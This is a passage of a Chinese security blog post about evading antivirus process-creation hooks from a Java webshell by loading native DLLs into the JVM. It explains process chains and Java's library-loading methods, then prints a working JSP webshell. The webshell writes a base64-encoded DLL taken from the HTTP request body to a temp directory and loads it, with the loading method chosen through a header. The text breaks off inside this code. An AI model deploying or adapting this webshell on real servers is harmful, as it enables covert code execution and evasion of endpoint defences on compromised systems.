<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>通过动态链接库绕过反病毒软件Hook - Break JVM - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>11</span>
<span class=rest>Aug 2022</span></div></div><div class=matter><h1 class=title>通过动态链接库绕过反病毒软件Hook - Break JVM</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x00-前言>0x00 前言</a></li><li><a href=#0x01-猜想的进程链>0x01 猜想的进程链</a></li><li><a href=#0x02-windows错误代码>0x02 Windows错误代码</a></li><li><a href=#0x03-java加载动态链接库常见的三种办法>0x03 Java加载动态链接库常见的三种办法</a></li><li><a href=#0x04-windows-动态链接库>0x04 Windows 动态链接库</a></li><li><a href=#0x05-实战绕过数字杀毒添加用户>0x05 实战绕过数字杀毒添加用户</a></li><li><a href=#0x06-将java进程进行权限提升>0x06 将Java进程进行权限提升</a><ol><li><a href=#0x061-efsrpcopenfileraw-提权>0x06.1 EfsRpcOpenFileRaw 提权</a></li></ol></li><li><a href=#0x07-武器化的思路与实现>0x07 武器化的思路与实现</a></li></ol></nav></aside><h2 id=0x00-前言>0x00 前言</h2><p>通常情况下获得Java Webshell碰到数字杀毒的场景居多，在这个环境中经常会遇到无法执行命令或命令被拦截的情况，很多小伙伴遇到这个问题就劝退了，我猜测是有一套进程链的检测方式导致了命令无法执行，于是去查看Java的文档，查阅到Java能够加载动态链接库且能够执行动态链接库中的代码，本文演示如何利用Java加载动态链接库的方式实现绕过了数字杀毒的拦截，但在演示之前，需要铺垫一些基础知识，如：猜想的进程链、Windows错误代码、Java加载动态链接库常见的三种办法、Windows动态链接库、土豆提权原理、命名管道技术等。</p><h2 id=0x01-猜想的进程链>0x01 猜想的进程链</h2><p>在获取Webshell以后，一般执行命令都会调用 <code>Runtime.exec</code> ，当然也有其他的命令执行方式，这里不再讨论，执行的命令一般分为两种：</p><ul><li>系统自带的PE文件，后面跟上参数</li><li>CMD或Powershell中内置的命令</li></ul><p>例如：<code>dir</code> 命令与<code>forfiles</code>命令，这两个命令都可以列出文件夹内的文件，但要执行 <code>dir</code> 需要启动 <code>cmd.exe</code> 或者 <code>powershell.exe</code> ，执行的过程中进程链就像这样：</p><p><img src=https://images.payloads.online/2022-08-11-22-03-10.png alt></p><p>在这个过程里，进程的链是<code>java.exe</code>创建了<code>cmd.exe</code> ，那么很容易就能发现问题，每执行一条命了都会创建一个<code>cmd.exe</code> 的进程。从<code>Runtime.exec</code> 执行命令到Windows API CreateProcess 创建<code>cmd.exe</code>这个进程是通过JVM翻译过来的，数字杀毒会Hook CreateProcess API达到监控拦截的目的。</p><p>而forfiles是一个PE文件，不是CMD内置的命令，所以不需要创建<code>cmd.exe</code>也可以执行，它的进程链会是这样：</p><p><img src=https://images.payloads.online/2022-08-11-22-03-39.png alt></p><p>达到了同样的目的，但是没有创建<code>cmd.exe</code> ，为了体验上的考量现在的大部分Webshell管理工具执行命令都是要创建cmd.exe的，那么如何让我们的操作都不创建<code>cmd.exe</code>呢？</p><p>其实只需要改一下原来的小马即可：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>				<span style=color:#75715e>// String cmdStr = &#34;cmd.exe /c forfiles.exe /p C:\\&#34; ;</span>
</span></span><span style=display:flex><span>        String cmdStr <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;forfiles.exe /p C:\\&#34;</span> ;
</span></span><span style=display:flex><span>        Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(cmdStr);
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>catch</span>(Exception e){
</span></span><span style=display:flex><span>        e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>这样虽然不会创建进程，但大部分命令还是会拦截，例如：net.exe net1.exe</p><p><img src=https://images.payloads.online/2022-08-11-22-04-02.png alt></p><h2 id=0x02-windows错误代码>0x02 Windows错误代码</h2><p>经常会遇到一些Windows下的工具刨出Error Code 5，到底代表什么意思？</p><p>这个Error Code 5其实是Windows的错误代码，每一个代码都代表了不同的含义。</p><p>查询错误代码的含义可以通过 <code>net helpmsg</code> 命令：</p><p><img src=https://images.payloads.online/2022-08-11-22-04-15.png alt></p><p>Visual Studio 有一个工具可以查询错误代码，名为errlookup：</p><p><img src=https://images.payloads.online/2022-08-11-22-04-27.png alt></p><p><img src=https://images.payloads.online/2022-08-11-22-04-35.png alt></p><p>有的时候Webshell管理工具并没有直接给出错误代码的含义，而是直接抛出错误代码，这种情况就能使用命令或者工具去查询，了解错误的发生到底是因为什么问题。</p><h2 id=0x03-java加载动态链接库常见的三种办法>0x03 Java加载动态链接库常见的三种办法</h2><p>Java加载动态链接库常见的有三种办法：</p><ul><li>System.load / System.loadLibrary</li><li>Runtime.getRuntime().load</li><li>com.sun.glass.utils.NativeLibLoader.loadLibrary</li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>RuntimeLoad</span>(String path){
</span></span><span style=display:flex><span>    Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>load</span>(path);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>SystemLoad</span>(String path){
</span></span><span style=display:flex><span>    System.<span style=color:#a6e22e>load</span>(path);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 有些JDK版本没有这个对象，因此采用反射加载进行运行</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>NativeLoad</span>(String path) <span style=color:#66d9ef>throws</span> Exception{
</span></span><span style=display:flex><span>    Class Native <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;com.sun.glass.utils.NativeLibLoader&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(Native <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>){
</span></span><span style=display:flex><span>        java.<span style=color:#a6e22e>lang</span>.<span style=color:#a6e22e>reflect</span>.<span style=color:#a6e22e>Method</span> Load <span style=color:#f92672>=</span> Native.<span style=color:#a6e22e>getDeclaredMethod</span>(<span style=color:#e6db74>&#34;loadLibrary&#34;</span>,String.<span style=color:#a6e22e>class</span>);
</span></span><span style=display:flex><span>        Load.<span style=color:#a6e22e>invoke</span>(path);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>第三种有些JDK版本没有这个对象，因此采用反射加载进行运行。</p><p>大致流程如下：</p><p><code>System.load</code> → <code>Runtime.getRuntime**()**.load0**()**</code> → <code>ClassLoader.loadLibrary</code> → <code>NativeLibrary.load</code> → <code>native void load*(*String name, boolean isBuiltin*)*</code></p><p>我实现了一个简单版本的DLL加载JSP代码，确保每一个请求都可以加载一个DLL模块到Java进程中：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>&lt;</span>jsp:declaration<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 获取随机的动态链接库文件名称</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> String <span style=color:#a6e22e>getFileName</span>(){
</span></span><span style=display:flex><span>    String fileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    java.<span style=color:#a6e22e>util</span>.<span style=color:#a6e22e>Random</span> random <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>util</span>.<span style=color:#a6e22e>Random</span>(System.<span style=color:#a6e22e>currentTimeMillis</span>());
</span></span><span style=display:flex><span>    String os <span style=color:#f92672>=</span> System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;os.name&#34;</span>).<span style=color:#a6e22e>toLowerCase</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (os.<span style=color:#a6e22e>contains</span>(<span style=color:#e6db74>&#34;windows&#34;</span>)){
</span></span><span style=display:flex><span>        fileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;C:\\Windows\\Temp\\&#34;</span> <span style=color:#f92672>+</span> random.<span style=color:#a6e22e>nextInt</span>(10000000) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.dll&#34;</span>;
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        fileName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/&#34;</span><span style=color:#f92672>+</span> random.<span style=color:#a6e22e>nextInt</span>(10000000) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.so&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> fileName;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// JSP 声明函数中无法获取全局默认的ServletRequest对象，但ServletRequest继承java.io.InputStream，可以替代</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>UploadBase64DLL</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>InputStream</span> stream) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>    sun.<span style=color:#a6e22e>misc</span>.<span style=color:#a6e22e>BASE64Decoder</span> b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> sun.<span style=color:#a6e22e>misc</span>.<span style=color:#a6e22e>BASE64Decoder</span>();
</span></span><span style=display:flex><span>    java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>File</span> file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>File</span>(getFileName());
</span></span><span style=display:flex><span>    java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>FileOutputStream</span> fos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>FileOutputStream</span>(file);
</span></span><span style=display:flex><span>    fos.<span style=color:#a6e22e>write</span>(b.<span style=color:#a6e22e>decodeBuffer</span>(stream));
</span></span><span style=display:flex><span>    fos.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> file.<span style=color:#a6e22e>getAbsolutePath</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>RuntimeLoad</span>(String path){
</span></span><span style=display:flex><span>    Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>load</span>(path);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>SystemLoad</span>(String path){
</span></span><span style=display:flex><span>    System.<span style=color:#a6e22e>load</span>(path);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 有些JDK版本没有这个对象，因此采用反射加载进行运行</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>NativeLoad</span>(String path) <span style=color:#66d9ef>throws</span> Exception{
</span></span><span style=display:flex><span>    Class Native <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;com.sun.glass.utils.NativeLibLoader&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(Native <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>){
</span></span><span style=display:flex><span>        java.<span style=color:#a6e22e>lang</span>.<span style=color:#a6e22e>reflect</span>.<span style=color:#a6e22e>Method</span> Load <span style=color:#f92672>=</span> Native.<span style=color:#a6e22e>getDeclaredMethod</span>(<span style=color:#e6db74>&#34;loadLibrary&#34;</span>,String.<span style=color:#a6e22e>class</span>);
</span></span><span style=display:flex><span>        Load.<span style=color:#a6e22e>invoke</span>(path);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span>jsp:declaration<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>jsp:scriptlet<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 加载方式</span>
</span></span><span style=display:flex><span>    String method <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getHeader</span>(<span style=color:#e6db74>&#34;WWW-Authenticate&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>{
</span></span><span style=display:flex><span>        ServletInputStream stream <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getInputStream</span>();
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (stream.<span style=color:#a6e22e>available</span>() <span style=color:#f92672>==</span> 0){
</span></span><span style=display:flex><span>          out.<span style=color:#a6e22e>println</span>(System.<span style=color:#a6e22e>getProperty</span>(<span style=color:#e6db74>&#34;os.arch&#34;</span>));
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      String file <span style=color:#f92672>=</span>  UploadBase64DLL(stream);
</span></span><span style=display:flex><span>      <span style=color:#75715e>// 按照Header头选择加载方式</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>switch</span> (method){
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;1&#34;</span>:
</span></span><span style=display:flex><span>              RuntimeLoad(file);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;2&#34;</span>:
</span></span><span style=display:flex><span>              SystemLoad(file);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;3&#34;</span>:
</span></span><span style=display:flex><span>              NativeLoad(file);
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>default</span>:
